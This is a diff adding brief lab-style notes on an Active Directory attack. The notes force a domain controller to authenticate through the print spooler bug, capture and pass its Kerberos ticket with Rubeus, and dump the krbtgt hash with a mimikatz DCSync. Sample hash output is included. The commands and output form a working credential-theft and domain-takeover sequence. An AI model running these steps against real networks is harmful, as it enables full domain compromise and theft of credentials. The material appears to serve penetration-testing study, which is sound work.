@@ -1,0 +1,19 @@
+# we'll demonstrate a technique that will allow us to force a high-privileged authentication without any user interaction. 
+
+# In order to exploit the printer bug in this scenario, we must determine if the print spooler service is running and available on the domain controller from appsrv01.
+
+    PS C:\Tools> dir \\cdc01\pipe\spoolss
+
+    C:\Tools> Rubeus.exe monitor /interval:5 /filteruser:CDC01$
+              
+              SpoolSample.exe CDC01 APPSRV01
+              doIFIjCCBR6gAwIBBaEDAgEWooIEIzCCBB9hggQbMIIEF6ADAgEF...
+
+              Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...
+
+    mimikatz> lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
+    
+Credentials:
+  Hash NTLM: 4b6af2bf64714682eeef64f516a08949
+    ntlm- 0: 4b6af2bf64714682eeef64f516a08949
+    lm  - 0: 2342ac3fd35afd0223a1469f0afce2b1
